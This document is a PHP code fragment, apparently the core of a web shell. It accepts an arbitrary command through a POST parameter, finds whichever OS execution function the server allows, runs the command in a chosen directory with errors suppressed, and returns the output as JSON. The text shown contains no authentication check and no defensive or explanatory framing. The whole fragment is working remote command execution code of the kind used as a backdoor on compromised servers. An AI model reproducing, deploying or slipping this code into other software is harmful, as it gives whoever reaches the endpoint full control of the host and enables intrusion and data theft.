if (isset($_POST['action']) && $_POST['action'] === 'shell') {
ob_end_clean();
set_time_limit(0);
header('Content-Type: application/json');
$cmd = $_POST['cmd'] ?? '';
$cwd = $_POST['cwd'] ?? getcwd();

if (!is_dir($cwd)) $cwd = getcwd();

// Probe for best available exec function (priority order)
$method = null;
foreach (['system','exec','shell_exec','passthru','popen','proc_open'] as $fn) {
if (function_exists($fn)) { $method = $fn; break; }
}

if (!$method) {
echo json_encode(['error' => 'No OS exec function available', 'available' => false]);
exit;
}

if ($cmd === '') {
// Probe only — return which function is available
echo json_encode(['available' => true, 'method' => $method, 'cwd' => $cwd, 'output' => '']);
exit;
}

// cd into working directory, run command, capture new cwd
$fullCmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1; echo "__CWD:$(pwd)"';
$output = '';

switch ($method) {
case 'system':
ob_start();
@system($fullCmd);
$output = ob_get_clean();
break;
case 'exec':
$lines = [];
@exec($fullCmd, $lines);
$output = implode("\n", $lines);
break;
case 'shell_exec':
$output = @shell_exec($fullCmd) ?? '';
break;
case 'passthru':
ob_start();
@passthru($fullCmd);
$output = ob_get_clean();
break;
case 'popen':
$handle = @popen($fullCmd, 'r');
if ($handle) {
while (!feof($handle)) $output .= fread($handle, 8192);
pclose($handle);
}
break;
case 'proc_open':
$desc = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
$proc = @proc_open($fullCmd, $desc, $pipes);
if (is_resource($proc)) {
$output = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($proc);
}
break;
}

// Extract new cwd from output
$newCwd = $cwd;
if (preg_match('/__CWD:(.+)$/m', $output, $m)) {
$newCwd = trim($m[1]);
$output = preg_replace('/__CWD:.+\n?$/', '', $output);
}

echo json_encode([
'output' => rtrim($output),
'cwd' => $newCwd,
'method' => $method,
'available' => true,
]);
exit;
}
